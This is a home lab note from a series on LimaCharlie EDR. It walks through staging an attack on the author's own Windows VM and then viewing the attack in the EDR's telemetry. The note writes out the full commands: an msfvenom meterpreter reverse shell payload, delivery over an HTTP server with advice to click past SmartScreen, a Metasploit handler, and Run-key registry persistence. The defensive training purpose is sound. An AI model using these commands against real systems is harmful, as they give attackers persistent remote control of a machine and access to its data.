---
{"dg-publish":true,"permalink":"/lima-charlie-staging-the-attack/"}
---

[[LimaCharlie Detection & Rules\|LimaCharlie Detection & Rules]]

At Windows machine create a folder that only administrator can access it:

Type the command in an elevated CMD:
```
mkdir C:\SensitiveData && icacls C:\SensitiveData /inheritance:r /grant Administrators:F
```

![Pasted image 20250315165903.png](/img/user/x/images/Pasted%20image%2020250315165903.png)
Then create a simple `.txt` file with a random content.

**Weaponization**
At the Ubuntu machine:
```C
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe > payload.exe
```

**Delivery**
At the Ubuntu machine:
```
python3 -m http.server 8080
```

Then at Windows machine:

![Pasted image 20250315162454.png](/img/user/x/images/Pasted%20image%2020250315162454.png)
If smartscreen blocks it, click **keep it anyway** button.

**Exploitation**
At the Ubuntu Machine, open up `msfconsole`:
```C
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 4444
exploit
```

Then run/execute the `payload.exe`.

**Persistence/Installation**

After successfull exploitation, it's time for installation, in the meterpreter shell drop down to `shell`:

```
shell
```

Query AutoRuns in registry:
```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s
```

![Pasted image 20250315164456.png](/img/user/x/images/Pasted%20image%2020250315164456.png)
Based on the output, it requires a key, data type, and path to the installation.

```C
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v goodbinary /t REG_SZ /d "C:\Users\lianne\Downloads\payload.exe" /f
```

- `/v` which key value to change.
- `/t` data type in this case string.
- `/d` the value for the key.
- `/f` force no need for confirmation.

![Pasted image 20250315164656.png](/img/user/x/images/Pasted%20image%2020250315164656.png)
At the registry editor:
![Pasted image 20250315164722.png](/img/user/x/images/Pasted%20image%2020250315164722.png)
Restart windows to test the persistence and rerun the `msfconsole` command:

![Pasted image 20250315165018.png](/img/user/x/images/Pasted%20image%2020250315165018.png)
**Action on Objectives**
Let's navigate back the `C:\SensitiveData` directory and access it's content:

```
cd "C:\\SensitiveData"
```

Then use the `cat` command to view the file's content:

![Pasted image 20250315192448.png](/img/user/x/images/Pasted%20image%2020250315192448.png)

Back at LimaCharlie, let's investigate this:

**Processes**: we can see our malicious binary here, of course the attacker would not name the malware in such an obvious way, that is why we need to have a good baseline of our system:

![Pasted image 20250315191741.png](/img/user/x/images/Pasted%20image%2020250315191741.png)
Additionally, at the network tab we can also see the attacker's IP address and port number:

![Pasted image 20250315191833.png](/img/user/x/images/Pasted%20image%2020250315191833.png)
**Remember:** We are not using any pre-built rules and detection or settings, now it's time to build and configure around it.

Next: [[LimaCharlie - Detecting the attack\|LimaCharlie - Detecting the attack]]


